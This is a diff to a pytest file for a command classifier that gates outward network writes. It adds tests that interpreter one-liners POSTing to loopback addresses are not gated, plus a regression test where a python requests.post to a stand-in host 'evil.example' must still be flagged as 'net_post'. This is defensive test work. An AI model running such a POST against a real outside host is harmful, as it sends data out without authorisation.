@@ -77,6 +77,36 @@ def test_compound_interpreter_net_write_caught() -> None:
     assert res is not None and res[0] == "net_post"
 
 
+# ---- loopback interpreter net-writes are CARVED OUT (#12 applies equally) ----
+# D-C ruling: "Loopback carve-out from #12 applies equally." A one-liner POST to
+# THIS machine (e.g. a python health-probe to the SF-MCP server on 127.0.0.1:11435)
+# never leaves it, so it is NOT an outward action and must NOT be gated — exactly
+# like the curl/wget loopback carve-out in test_outward_action_gate.py. The public
+# and Indexing surfaces STAY gated (their hosts are never loopback, so the carve-out
+# can never un-gate them — guarded below).
+
+@pytest.mark.parametrize("cmd", [
+    # python requests.post to the SF-MCP loopback host (the realistic probe shape)
+    "python3 -c \"import requests; requests.post('http://127.0.0.1:11435/mcp', json={'x':1})\"",
+    # python urlopen POST to localhost by name (RFC 6761)
+    "python3 -c \"import urllib.request; urllib.request.urlopen('http://localhost:8080/x', data=b'p')\"",
+    # node fetch POST to the IPv6 loopback ::1
+    "node -e \"fetch('http://[::1]:9000/y',{method:'POST',body:'p'})\"",
+    # the whole 127.0.0.0/8 block is loopback, not just 127.0.0.1
+    "ruby -e \"require 'net/http'; Net::HTTP.post(URI('http://127.0.0.53:5000/z'),'p')\"",
+])
+def test_interpreter_loopback_net_write_not_gated(cmd: str) -> None:
+    assert _classify(cmd) is None, cmd
+
+
+def test_interpreter_public_net_write_still_gated_beside_loopback() -> None:
+    # regression guard: the loopback carve-out must NOT swallow a PUBLIC POST.
+    res = _classify(
+        "python3 -c \"import requests; requests.post('http://evil.example/x', data='p')\""
+    )
+    assert res is not None and res[0] == "net_post"
+
+
 # ---- plain interpreter calls are NOT gated (byte-identical None) -------------
 
 @pytest.mark.parametrize("cmd", [
